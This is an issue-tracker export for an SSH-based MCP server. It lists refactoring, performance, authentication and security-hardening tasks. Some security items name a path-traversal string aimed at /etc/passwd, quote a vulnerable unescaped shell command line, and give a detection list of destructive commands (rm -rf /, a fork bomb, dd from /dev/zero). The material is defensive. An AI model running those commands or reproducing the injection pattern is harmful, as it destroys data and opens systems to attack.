{"id":"scout_mcp-ffd","title":"HIGH: Fix test infrastructure import conflict","description":"**TEST INFRASTRUCTURE BROKEN**\n\nDirectory `tests/test_integration/` conflicts with `tests/test_integration.py`\n\n**Error:**\n```\nimport file mismatch:\nimported module 'tests.test_integration' has this __file__ attribute:\n  /mnt/cache/code/scout_mcp/tests/test_integration\nwhich is not the same as the test file we want to collect:\n  /mnt/cache/code/scout_mcp/tests/test_integration.py\n```\n\n**Impact:** Cannot collect all 375 tests","design":"**Fix:** Remove conflicting directory\n\n```bash\nrm -rf tests/test_integration/\n```\n\nAlready completed.","acceptance_criteria":"- [x] Directory removed\n- [ ] All 375 tests collected successfully\n- [ ] pytest runs without import errors","status":"closed","priority":1,"issue_type":"bug","created_at":"2025-12-09T16:08:24.147666133-05:00","updated_at":"2025-12-09T16:08:32.609003735-05:00","closed_at":"2025-12-09T16:08:32.609003735-05:00"}
{"id":"scout_mcp-fib","title":"Add Security Audit Logging","description":"**MEDIUM PRIORITY - Security**\n\nNo security event logging for authentication, authorization, or access attempts.\n\n**Missing Security Events:**\n- Authentication attempts (success/failure)\n- Authorization decisions\n- SSH connection attempts\n- Command execution audit trail\n- File access logging\n- Configuration changes\n\n**Fix:** Add security audit logger:\n```python\n# scout_mcp/utils/audit.py\nimport logging\nfrom datetime import datetime\n\nsecurity_logger = logging.getLogger(\"scout_mcp.security\")\n\ndef log_connection_attempt(host: str, success: bool, error: str | None = None):\n    security_logger.info(\n        \"SSH_CONNECTION host=%s success=%s error=%s\",\n        host, success, error\n    )\n\ndef log_command_execution(host: str, command: str, user: str | None = None):\n    security_logger.info(\n        \"COMMAND_EXEC host=%s command=%s user=%s\",\n        host, command[:100], user\n    )\n\ndef log_file_access(host: str, path: str, operation: str):\n    security_logger.info(\n        \"FILE_ACCESS host=%s path=%s operation=%s\",\n        host, path, operation\n    )\n```\n\n**Configuration:**\n```\nSCOUT_AUDIT_LOG_FILE=/var/log/scout_mcp/audit.log\nSCOUT_AUDIT_LOG_LEVEL=INFO\n```\n\n**Effort:** 4 hours","status":"open","priority":2,"issue_type":"feature","created_at":"2025-12-03T23:01:10.310154435-05:00","updated_at":"2025-12-03T23:01:10.310154435-05:00","labels":["logging","security","week-3"]}
{"id":"scout_mcp-go3","title":"Implement Result Caching for Files and Commands","description":"**MEDIUM PRIORITY - Performance**\n\nNo caching exists for file reads or command outputs. Repeated requests always hit remote hosts.\n\n**Current:** Every `scout(\"host:/path/file\")` fetches from remote\n\n**Implementation:**\n```python\nfrom functools import lru_cache\nfrom datetime import datetime, timedelta\nfrom hashlib import sha256\n\nclass ResultCache:\n    def __init__(self, ttl_seconds: int = 60, max_size: int = 1000):\n        self._cache: dict[str, tuple[str, datetime]] = {}\n        self._ttl = timedelta(seconds=ttl_seconds)\n        self._max_size = max_size\n    \n    def _make_key(self, host: str, path: str, command: str | None = None) -\u003e str:\n        return sha256(f\"{host}:{path}:{command or ''}\".encode()).hexdigest()\n    \n    def get(self, host: str, path: str, command: str | None = None) -\u003e str | None:\n        key = self._make_key(host, path, command)\n        if key in self._cache:\n            result, timestamp = self._cache[key]\n            if datetime.now() - timestamp \u003c self._ttl:\n                return result\n            del self._cache[key]\n        return None\n    \n    def set(self, host: str, path: str, result: str, command: str | None = None):\n        if len(self._cache) \u003e= self._max_size:\n            # Evict oldest entry\n            oldest_key = min(self._cache, key=lambda k: self._cache[k][1])\n            del self._cache[oldest_key]\n        \n        key = self._make_key(host, path, command)\n        self._cache[key] = (result, datetime.now())\n    \n    def invalidate(self, host: str, path: str | None = None):\n        \"\"\"Invalidate cache entries for a host (or specific path).\"\"\"\n        # Implementation...\n```\n\n**Usage in scout tool:**\n```python\ncache = get_cache()\ncached = cache.get(host, path, query)\nif cached is not None:\n    return cached\n\nresult = await execute_operation(...)\ncache.set(host, path, result, query)\nreturn result\n```\n\n**Configuration:**\n```bash\nSCOUT_CACHE_ENABLED=true\nSCOUT_CACHE_TTL=60           # seconds\nSCOUT_CACHE_MAX_SIZE=1000    # entries\n```\n\n**Considerations:**\n- Don't cache command outputs by default (side effects)\n- Cache file reads with short TTL\n- Invalidate on write operations\n\n**Effort:** 4 hours","status":"open","priority":2,"issue_type":"feature","created_at":"2025-12-03T23:24:06.547283745-05:00","updated_at":"2025-12-03T23:24:06.547283745-05:00","labels":["caching","performance","week-3"]}
{"id":"scout_mcp-gvf","title":"LOW: Remove type suppressions with proper type narrowing","description":"**TYPE SAFETY**\n\n2 files use `# type: ignore` comments that should use proper type narrowing.\n\n**Locations:**\n- `scout_mcp/models/ssh.py`\n- `scout_mcp/tools/scout.py:70`\n\n**Example:**\n```python\n# BEFORE:\nssh_host = config.get_host(parsed.host)  # type: ignore[arg-type]\n\n# AFTER:\nif parsed.host is None:\n    return \"Error: Host not specified\"\nssh_host = config.get_host(parsed.host)  # Now properly typed\n```","design":"Use type guards and early returns for type narrowing.","acceptance_criteria":"- [ ] Zero `# type: ignore` comments\n- [ ] mypy --strict passes\n- [ ] Tests passing","status":"open","priority":3,"issue_type":"task","created_at":"2025-12-09T16:08:24.206530512-05:00","updated_at":"2025-12-09T16:08:24.206530512-05:00"}
{"id":"scout_mcp-hcg","title":"Change Default Binding to 127.0.0.1","description":"**HIGH PRIORITY - Security**\n\nDefault binding to `0.0.0.0` exposes service to entire network.\n\n**Location:** `scout_mcp/__main__.py`\n\n**Current:** Binds to all interfaces by default\n**Impact:** Exposes unauthenticated service to network (CVSS 6.5)\n\n**Fix:**\n```python\n# Change default from 0.0.0.0 to 127.0.0.1\nSCOUT_HTTP_HOST = os.getenv(\"SCOUT_HTTP_HOST\", \"127.0.0.1\")\n```\n\n**Documentation:** Update CLAUDE.md to explain network binding implications\n\n**Effort:** 30 minutes","status":"closed","priority":1,"issue_type":"bug","created_at":"2025-12-03T23:00:01.842659487-05:00","updated_at":"2025-12-03T23:15:48.457237679-05:00","closed_at":"2025-12-03T23:15:48.457237679-05:00","labels":["quick-win","security","week-1"]}
{"id":"scout_mcp-isv","title":"MEDIUM: Implement ResourceRegistry pattern to reduce duplication","description":"**CODE DUPLICATION - 167 LINES**\n\nRepetitive closure factories in server.py for resource registration.\n\n**Location:** `scout_mcp/server.py:195-361`\n\n**Issue:** \n- Same pattern repeated 12 times\n- Adding new resource requires modifying app_lifespan()\n- Violates Open/Closed Principle\n\n**Current Pattern (repeated):**\n```python\ndef make_docker_logs_handler(h: str) -\u003e Any:\n    async def handler(container: str) -\u003e str:\n        return await _read_docker_logs(h, container)\n    return handler\n\nserver.resource(...)(make_docker_logs_handler(host_name))\n```","design":"**ResourceRegistry Pattern:**\n\n```python\n# scout_mcp/resources/registry.py\n@dataclass\nclass ResourceTemplate:\n    uri_pattern: str  # \"{host}://docker/{container}/logs\"\n    name_template: str\n    description_template: str\n    mime_type: str\n    handler_factory: Callable[[str], Callable]\n\nclass ResourceRegistry:\n    def register(self, template: ResourceTemplate) -\u003e None: ...\n    def register_all_for_hosts(self, server, hosts) -\u003e None: ...\n\n# scout_mcp/server.py - SIMPLIFIED:\nregistry = ResourceRegistry()\nregistry.register(DOCKER_LOGS_TEMPLATE)\nregistry.register(DOCKER_LIST_TEMPLATE)\nregistry.register_all_for_hosts(server, hosts)\n```\n\n**Benefit:** Reduces server.py from 500→200 lines","acceptance_criteria":"- [ ] ResourceTemplate dataclass created\n- [ ] ResourceRegistry implemented\n- [ ] All 12 resource types migrated to templates\n- [ ] server.py reduced by 60%+ lines\n- [ ] All existing resources still work\n- [ ] Tests passing","status":"open","priority":2,"issue_type":"task","created_at":"2025-12-09T16:08:24.18140246-05:00","updated_at":"2025-12-09T16:08:24.18140246-05:00"}
{"id":"scout_mcp-kvk","title":"Fix Global Lock Performance Issue","description":"**HIGH PRIORITY - Performance**\n\nSingle `asyncio.Lock` for all hosts causes 10x slowdown on multi-host operations.\n\n**Location:** `scout_mcp/services/pool.py:25`\n\n**Issue:** Connection pool uses a single global lock, serializing all connection operations even for different hosts.\n\n**Impact:**\n- Single-host: ~200 req/s\n- Multi-host: ~20 req/s (10x slower than expected)\n\n**Fix:** Use per-host locks:\n```python\nclass ConnectionPool:\n    def __init__(self):\n        self._connections: dict[str, PooledConnection] = {}\n        self._locks: dict[str, asyncio.Lock] = {}\n        self._locks_lock = asyncio.Lock()  # For creating new locks\n    \n    async def _get_host_lock(self, host_name: str) -\u003e asyncio.Lock:\n        async with self._locks_lock:\n            if host_name not in self._locks:\n                self._locks[host_name] = asyncio.Lock()\n            return self._locks[host_name]\n    \n    async def get_connection(self, host: SSHHost) -\u003e asyncssh.SSHClientConnection:\n        lock = await self._get_host_lock(host.name)\n        async with lock:\n            # ... connection logic\n```\n\n**Effort:** 3 hours","status":"closed","priority":1,"issue_type":"bug","created_at":"2025-12-03T23:00:01.783172162-05:00","updated_at":"2025-12-04T03:57:18.819601645-05:00","closed_at":"2025-12-04T03:57:18.819601645-05:00","labels":["performance","week-4"]}
{"id":"scout_mcp-n4s","title":"Split executors.py by Domain","description":"**MEDIUM PRIORITY - Code Organization**\n\n`executors.py` is 642 lines with 5 domain concerns in one file, violating Single Responsibility Principle.\n\n**Location:** `scout_mcp/services/executors.py`\n\n**Current Domains Mixed:**\n1. Filesystem operations (cat, ls, stat, tree)\n2. Docker operations (ps, logs, inspect)\n3. Compose operations (config, services)\n4. ZFS operations (pools, datasets, snapshots)\n5. Syslog operations (log reading)\n\n**Fix:** Split into domain-specific modules:\n```\nscout_mcp/services/executors/\n├── __init__.py      # Re-exports for backward compat\n├── filesystem.py    # cat_file, ls_dir, stat_path, tree_dir\n├── docker.py        # docker_ps, docker_logs, docker_inspect\n├── compose.py       # compose_config, compose_services\n├── zfs.py           # zfs_list, zfs_snapshots\n└── syslog.py        # read_syslog\n```\n\n**Effort:** 4 hours","status":"open","priority":2,"issue_type":"task","created_at":"2025-12-03T23:01:10.162195574-05:00","updated_at":"2025-12-03T23:01:10.162195574-05:00","labels":["code-quality","refactoring","week-2"]}
{"id":"scout_mcp-nab","title":"Extract Bytes Decoding Utility","description":"**MEDIUM PRIORITY - Code Duplication**\n\nSame bytes decoding logic repeated 17 times in executors.py.\n\n**Location:** `scout_mcp/services/executors.py`\n\n**Duplicated Pattern:**\n```python\nif isinstance(stdout, bytes):\n    content = stdout.decode(\"utf-8\", errors=\"replace\")\nelse:\n    content = stdout\n```\n\n**Fix:** Create `scout_mcp/utils/encoding.py`:\n```python\ndef decode_ssh_output(data: bytes | str | None, default: str = \"\") -\u003e str:\n    \"\"\"Safely decode SSH command output to string.\n    \n    Args:\n        data: Raw output from asyncssh (bytes, str, or None)\n        default: Default value if data is None\n        \n    Returns:\n        Decoded string with UTF-8 encoding, replacing errors\n    \"\"\"\n    if data is None:\n        return default\n    if isinstance(data, bytes):\n        return data.decode(\"utf-8\", errors=\"replace\")\n    return data\n```\n\n**Effort:** 1 hour","status":"open","priority":2,"issue_type":"task","created_at":"2025-12-03T23:01:10.221887875-05:00","updated_at":"2025-12-03T23:01:10.221887875-05:00","labels":["code-quality","refactoring","week-3"]}
{"id":"scout_mcp-pya","title":"Add Path Traversal Protection","description":"**HIGH PRIORITY - Security**\n\nNo protection against path traversal attacks like `../../../../etc/passwd`.\n\n**Location:** `scout_mcp/utils/parser.py`\n\n**Current Mitigation:** Relies on SSH server permissions (trust boundary)\n\n**Fix:** Add explicit path validation:\n```python\ndef validate_path(path: str) -\u003e str:\n    \"\"\"Validate path doesn't contain traversal sequences.\"\"\"\n    # Reject obvious traversal attempts\n    if \"..\" in path:\n        raise ValueError(f\"Path traversal not allowed: {path}\")\n    \n    # Normalize and validate\n    normalized = os.path.normpath(path)\n    if normalized.startswith(\"..\"):\n        raise ValueError(f\"Path escapes root: {path}\")\n    \n    return normalized\n```\n\n**Documentation:** Add trust boundary documentation explaining SSH server is security boundary.\n\n**Effort:** 2 hours","status":"closed","priority":1,"issue_type":"feature","created_at":"2025-12-03T23:00:01.886647969-05:00","updated_at":"2025-12-04T03:57:10.427253045-05:00","closed_at":"2025-12-04T03:57:10.427253045-05:00","labels":["security","week-2"]}
{"id":"scout_mcp-uol","title":"Remove Type Suppressions","description":"**MEDIUM PRIORITY - Type Safety**\n\n2 files use `# type: ignore` comments that should be replaced with proper type narrowing.\n\n**Locations:**\n- `scout_mcp/models/ssh.py`\n- `scout_mcp/tools/scout.py`\n\n**Example Issue:**\n```python\n# scout.py:70 - Current:\nssh_host = config.get_host(parsed.host)  # type: ignore[arg-type]\n```\n\n**Fix:** Add proper type narrowing:\n```python\n# Better approach:\nassert parsed.host is not None, \"Host must be set for non-hosts commands\"\nssh_host = config.get_host(parsed.host)\n```\n\nOr use explicit type guards:\n```python\nif parsed.host is None:\n    return \"Error: Host not specified\"\nssh_host = config.get_host(parsed.host)  # Now properly typed\n```\n\n**Effort:** 2 hours","status":"open","priority":2,"issue_type":"task","created_at":"2025-12-03T23:01:10.255151433-05:00","updated_at":"2025-12-03T23:01:10.255151433-05:00","labels":["code-quality","type-safety","week-3"]}
{"id":"scout_mcp-vid","title":"Implement Google OAuth Authentication via FastMCP","description":"**CRITICAL SECURITY**\n\nReplace API key auth plan with Google OAuth via FastMCP's built-in auth support.\n\n**Location:** `scout_mcp/server.py`\n\n**Implementation:**\n```python\nfrom fastmcp.auth import GoogleOAuth\n\nmcp = FastMCP(\n    \"scout_mcp\",\n    auth=GoogleOAuth(\n        client_id=os.getenv(\"SCOUT_GOOGLE_CLIENT_ID\"),\n        client_secret=os.getenv(\"SCOUT_GOOGLE_CLIENT_SECRET\"),\n        redirect_uri=os.getenv(\"SCOUT_OAUTH_REDIRECT_URI\", \"http://localhost:8000/callback\"),\n        allowed_domains=os.getenv(\"SCOUT_ALLOWED_DOMAINS\", \"\").split(\",\"),  # e.g., \"company.com\"\n    )\n)\n```\n\n**Environment Variables:**\n```bash\nSCOUT_GOOGLE_CLIENT_ID=your-client-id.apps.googleusercontent.com\nSCOUT_GOOGLE_CLIENT_SECRET=your-client-secret\nSCOUT_OAUTH_REDIRECT_URI=http://localhost:8000/callback\nSCOUT_ALLOWED_DOMAINS=company.com,partner.com  # Optional domain restriction\n```\n\n**Setup Steps:**\n1. Create Google Cloud OAuth credentials\n2. Configure authorized redirect URIs\n3. Set environment variables\n4. Update documentation\n\n**Replaces:** scout_mcp-0wx (API Key Authentication)","status":"open","priority":1,"issue_type":"feature","created_at":"2025-12-03T23:24:06.483260098-05:00","updated_at":"2025-12-03T23:24:06.483260098-05:00","labels":["critical","oauth","security","week-1"]}
{"id":"scout_mcp-vn7","title":"Update asyncssh to fix known CVEs","description":"**CRITICAL SECURITY**\n\nCurrent constraint `asyncssh\u003e=2.14.0` allows versions with known CVEs.\n\n**Location:** `pyproject.toml:9`\n\n**CVEs:**\n- CVE-2023-48795 (Terrapin Attack) - Fixed in 2.14.2\n- CVE-2023-46446 (Rogue Session) - Fixed in 2.14.1\n- CVE-2023-46445 (Message Injection) - Fixed in 2.14.1\n\n**Fix:**\n```toml\n\"asyncssh\u003e=2.14.2\"\n```\n\n**Effort:** 5 minutes","status":"closed","priority":1,"issue_type":"bug","created_at":"2025-12-03T22:58:54.996948791-05:00","updated_at":"2025-12-04T03:57:10.362419624-05:00","closed_at":"2025-12-04T03:57:10.362419624-05:00","labels":["critical","quick-win","security","week-1"]}
{"id":"scout_mcp-vor","title":"Standardize Parameter Naming (conn vs connection)","description":"**LOW PRIORITY - Naming Consistency**\n\nInconsistent parameter naming: `conn` vs `connection` used interchangeably.\n\n**Examples:**\n- Some functions use `conn: SSHClientConnection`\n- Others use `connection: SSHClientConnection`\n\n**Fix:** Standardize on one naming convention throughout codebase.\n\n**Recommendation:** Use `conn` (shorter, more common in async code)\n\n**Effort:** 30 minutes","status":"open","priority":3,"issue_type":"chore","created_at":"2025-12-03T23:02:02.333346772-05:00","updated_at":"2025-12-03T23:02:02.333346772-05:00","labels":["code-quality","naming"]}
{"id":"scout_mcp-vqe","title":"HIGH: Add security audit logging for command execution","description":"**SECURITY ENHANCEMENT**\n\nNo audit trail for remote command execution. Need logging for:\n- All command executions\n- SSH connection attempts\n- File access operations\n- Warnings for dangerous command patterns\n\n**Current Gap:** User can execute `rm -rf /` with no warning or audit log","design":"**Audit Events:**\n\n```python\n# scout.py\nlogger.info(\"COMMAND_EXEC host=%s path=%s command=%s\", host, path, cmd[:200])\n\n# Dangerous pattern detection\nDANGEROUS_PATTERNS = [\n    r\"rm\\s+-rf\\s+/\",\n    r\":\\(\\)\\{.*:\\|:\u0026\\s*\\};:\",  # Fork bomb\n    r\"dd\\s+if=/dev/zero\",\n]\n\nfor pattern in DANGEROUS_PATTERNS:\n    if re.search(pattern, query, re.IGNORECASE):\n        logger.warning(\"SECURITY_WARNING: Dangerous command: %s\", query[:100])\n```","acceptance_criteria":"- [ ] All command executions logged\n- [ ] Dangerous patterns trigger warnings\n- [ ] Logs include host, path, command\n- [ ] Integration test verifies logging\n- [ ] Documentation explains security model","status":"open","priority":1,"issue_type":"feature","created_at":"2025-12-09T16:08:24.116248952-05:00","updated_at":"2025-12-09T16:08:24.116248952-05:00"}
{"id":"scout_mcp-x0d","title":"Sanitize Error Messages for Production","description":"**LOW PRIORITY - Information Disclosure**\n\nDetailed error messages may leak implementation details in production.\n\n**Issue:** Error responses include stack traces, file paths, and internal details.\n\n**Fix:** Add production mode error sanitization:\n```python\nimport os\n\nPRODUCTION = os.getenv(\"SCOUT_ENV\", \"development\") == \"production\"\n\ndef sanitize_error(error: Exception) -\u003e str:\n    if PRODUCTION:\n        # Return generic message in production\n        return f\"An error occurred: {type(error).__name__}\"\n    else:\n        # Return detailed message in development\n        return str(error)\n```\n\n**Configuration:**\n```\nSCOUT_ENV=production  # Enable sanitization\n```\n\n**Effort:** 2 hours","status":"open","priority":3,"issue_type":"feature","created_at":"2025-12-03T23:02:02.399597856-05:00","updated_at":"2025-12-03T23:02:02.399597856-05:00","labels":["error-handling","security"]}
{"id":"scout_mcp-y1k","title":"CRITICAL: Fix command injection in compose_logs() tail parameter","description":"**CRITICAL SECURITY VULNERABILITY**\n\nSame issue as docker_logs() - unvalidated tail parameter.\n\n**Location:** `scout_mcp/services/executors.py:423`\n\n```python\ncmd = f\"docker compose -p {shlex.quote(project)} logs --tail {tail} {ts_flag} 2\u003e\u00261\"\n#                                                              ^^^^\n```","design":"Apply identical validation as docker_logs().","acceptance_criteria":"- [ ] Validation added\n- [ ] Tests passing","status":"open","priority":1,"issue_type":"bug","created_at":"2025-12-09T16:08:24.06086571-05:00","updated_at":"2025-12-09T16:08:24.06086571-05:00"}
{"id":"scout_mcp-y6f","title":"Unblock Async Tests and Achieve 85% Coverage","description":"**HIGH PRIORITY - Testing**\n\nCurrent coverage is only 32% (133 tests blocked by pytest-asyncio issues).\n\n**Current State:**\n- 67 tests passing (config, main, module structure)\n- 133 tests blocked by missing/misconfigured pytest-asyncio\n- Target: 85%+ coverage\n\n**Blocked Tests Location:** `tests/`\n\n**Fix Steps:**\n1. Fix pytest-asyncio configuration in pyproject.toml\n2. Unblock 133 async tests\n3. Add missing unit tests for executors\n4. Add security test suite\n5. Add integration tests\n\n**Coverage Gaps:**\n- `executors.py`: 7%\n- `scout tool`: 10%\n- `resources/*`: 6-15%\n\n**Effort:** 20-30 hours","status":"closed","priority":1,"issue_type":"task","created_at":"2025-12-03T23:00:01.824937945-05:00","updated_at":"2025-12-04T03:57:18.746217365-05:00","closed_at":"2025-12-04T03:57:18.746217365-05:00","labels":["testing","week-3"]}
{"id":"scout_mcp-ydy","title":"Split scout() Function into Handlers","description":"**HIGH PRIORITY - God Function**\n\nThe `scout()` function is 128 lines handling 5+ responsibilities, violating the 50-line limit.\n\n**Location:** `scout_mcp/tools/scout.py:19-147`\n\n**Current Responsibilities:**\n1. Host listing\n2. Target validation\n3. Connection retry\n4. Command execution\n5. File/directory operations\n\n**Fix:** Split into separate handlers:\n```python\nasync def scout(target: str, query: str | None = None, tree: bool = False) -\u003e str:\n    \"\"\"Main entry point - delegates to handlers.\"\"\"\n    parsed = parse_target(target)\n    \n    if parsed.is_hosts_command:\n        return await _handle_hosts_list()\n    \n    ssh_host = _validate_and_get_host(parsed.host)\n    conn = await get_connection_with_retry(ssh_host)\n    \n    if query:\n        return await _handle_command_execution(conn, parsed.path, query)\n    \n    path_type = await stat_path(conn, parsed.path)\n    if path_type == \"file\":\n        return await _handle_file_read(conn, parsed.path)\n    elif path_type == \"directory\":\n        return await _handle_directory_list(conn, parsed.path, tree)\n    else:\n        return f\"Error: Path not found: {parsed.path}\"\n```\n\n**Impact:** Improves testability, readability, maintainability\n**Effort:** 4 hours","status":"closed","priority":1,"issue_type":"task","created_at":"2025-12-03T23:00:01.756759256-05:00","updated_at":"2025-12-04T03:57:10.444437886-05:00","closed_at":"2025-12-04T03:57:10.444437886-05:00","labels":["code-quality","refactoring","week-2"],"dependencies":[{"issue_id":"scout_mcp-ydy","depends_on_id":"scout_mcp-2rf","type":"blocks","created_at":"2025-12-03T23:02:09.636116458-05:00","created_by":"daemon"}]}
{"id":"scout_mcp-zge","title":"Fix Command Injection Vulnerability","description":"**CRITICAL SECURITY (CVSS 8.8)**\n\nUser input directly interpolated into shell commands using `repr()`. Should use `shlex.quote()` for proper shell escaping.\n\n**Location:** `scout_mcp/services/executors.py:161`\n\n**Current Code:**\n```python\nfull_command = f\"cd {working_dir!r} \u0026\u0026 timeout {timeout} {command}\"\n```\n\n**Fix:**\n```python\nimport shlex\nfull_command = f\"cd {shlex.quote(working_dir)} \u0026\u0026 timeout {timeout} {shlex.quote(command)}\"\n```\n\n**Impact:** Potential for shell command injection if input escaping fails.","status":"closed","priority":1,"issue_type":"bug","created_at":"2025-12-03T22:58:54.977618473-05:00","updated_at":"2025-12-04T03:57:10.381706692-05:00","closed_at":"2025-12-04T03:57:10.381706692-05:00","labels":["critical","security","week-1"]}
{"id":"scout_mcp-zxn","title":"Add Connection Timeout Configuration","description":"**LOW PRIORITY - Reliability**\n\nSSH operations can hang indefinitely without explicit timeout.\n\n**Current:** No connection-level timeout configured\n\n**Fix:** Add configurable connection timeout:\n```python\nSCOUT_CONNECTION_TIMEOUT = int(os.getenv(\"SCOUT_CONNECTION_TIMEOUT\", \"30\"))\n\nconn = await asyncio.wait_for(\n    asyncssh.connect(host.hostname, ...),\n    timeout=SCOUT_CONNECTION_TIMEOUT\n)\n```\n\n**Environment Variable:**\n```\nSCOUT_CONNECTION_TIMEOUT=30\n```\n\n**Effort:** 1 hour","status":"open","priority":3,"issue_type":"feature","created_at":"2025-12-03T23:02:02.413661382-05:00","updated_at":"2025-12-03T23:02:02.413661382-05:00","labels":["performance","reliability"]}
